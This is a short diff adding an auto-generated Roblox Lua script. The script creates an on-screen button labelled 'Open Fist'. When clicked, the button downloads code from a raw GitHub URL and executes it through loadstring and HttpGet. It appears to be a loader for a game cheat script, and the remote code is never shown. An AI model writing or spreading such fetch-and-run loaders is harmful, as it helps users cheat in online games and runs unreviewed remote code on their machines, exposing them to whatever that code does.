@@ -1,0 +1,31 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local SCFOPEN = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+SCFOPEN.Name = "SCF OPEN"
+SCFOPEN.Parent = ScreenGui
+SCFOPEN.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+SCFOPEN.Position = UDim2.new(0.00363636366, 0, 0.713968933, 0)
+SCFOPEN.Size = UDim2.new(0, 103, 0, 50)
+SCFOPEN.Font = Enum.Font.SourceSansBold
+SCFOPEN.Text = "Open Fist"
+SCFOPEN.TextColor3 = Color3.fromRGB(0, 0, 0)
+SCFOPEN.TextScaled = true
+SCFOPEN.TextSize = 14.000
+SCFOPEN.TextStrokeTransparency = 0.900
+SCFOPEN.TextWrapped = true
+SCFOPEN.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/erikkire123/SPTS-CUSTOM/main/Yas"), true))()
+end)
+
+UICorner.Parent = SCFOPEN
